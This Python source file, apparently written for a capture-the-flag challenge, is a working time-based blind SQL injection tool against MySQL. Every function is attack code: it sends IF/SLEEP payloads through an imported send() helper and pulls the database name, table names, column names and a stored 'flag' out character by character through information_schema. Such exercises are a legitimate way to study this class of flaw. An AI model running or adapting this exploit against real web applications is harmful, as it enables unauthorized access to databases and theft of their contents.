import time
from utils import BASE_URL, send, charset

def send_time_payload(payload, threshold):
    start = time.time()
    send(payload)
    elapsed = time.time() - start
    return elapsed > threshold

def get_db_length(max_length, delay, threshold):
    print("[*] Finding db length using time-based technique...")
    for length in range(1, max_length + 1):
        payload = f"1' AND IF(LENGTH(database())={length}, SLEEP({delay}), 0) -- "
        if send_time_payload(payload, threshold):
            print(f"[+] Db name length: {length}")
            return length
    print("[-] Failed to detect length.")
    return None

def extract_database_name(length, delay, threshold):
    print("[*] Extracting db name...")
    db_name = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"1' AND IF(ASCII(SUBSTRING(database(),{i},1))={ord(char)}, SLEEP({delay}), 0) -- "
            )
            if send_time_payload(payload, threshold):
                db_name += char
                print(f"[+] Found char {i}: {char} -> {db_name}")
                break
        else:
            print(f"[-] No char matched at position {i}")
            break
    print(f"\n Database name: {db_name}")
    return db_name


def extract_table_name(db_name, length, delay, threshold):
    print(f"[*] Extracting table name from schema '{db_name}'...")
    table_name = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"1' AND IF(ascii(SUBSTRING(("
                f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='{db_name}' LIMIT 1 OFFSET 0"
                f"),{i},1))={ord(char)}, SLEEP({delay}), 0) -- "
            )
            if send_time_payload(payload, threshold):
                table_name += char
                print(f"[+] Found char {i}: {char} --> {table_name}")
                break
        else:
            print(f"[-] No match for position {i}")
            break
    return table_name

def extract_column_name_by_offset(offset, length, table_name, delay, threshold):
    print(f"[*] Extracting column name at offset {offset} from table '{table_name}'...")
    col_name = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"1' AND IF(ascii(substring(("
                f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {offset}"
                f"),{i},1))={ord(char)}, SLEEP({delay}), 0) -- "
            )
            if send_time_payload(payload, threshold):
                col_name += char
                print(f"[+] Found char {i}: {char} --> {col_name}")
                break
        else:
            print(f"[-] No match for position {i}")
            break
    return col_name

def extract_flag_value(length, col_name, table_name, delay, threshold):
    print(f"[*] Extracting flag from '{col_name}' column...")
    flag = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"1' AND IF(ascii(substring(("
                f"SELECT {col_name} FROM {table_name} LIMIT 1 OFFSET 0"
                f"),{i},1))={ord(char)}, SLEEP({delay}), 0) -- "
            )
            if send_time_payload(payload, threshold):
                flag += char
                print(f"[+] Found char {i}: {char} --> {flag}")
                break
        else:
            print(f"[-] No match for position {i}. Ending.")
            break
    return flag

# if extracting flag failed , continue :
def extract_remained_flag_chars(length, col_name, table_name, known_prefix, delay, threshold):
    flag = known_prefix
    for i in range(len(flag) + 1, length + 1):
        for char in charset:
            payload = (
                f"1' AND IF(ASCII(SUBSTRING(("
                f"SELECT {col_name} FROM {table_name} LIMIT 1 OFFSET 0"
                f"),{i},1))={ord(char)}, SLEEP({delay}), 0) -- "
            )
            
            if send_time_payload(payload, threshold):
                flag += char
                print(f"[+] Found char {i}: {char} --> {flag}")
                break
        else:
            print(f"[-] No match for position {i}. Ending.")
            break

    return flag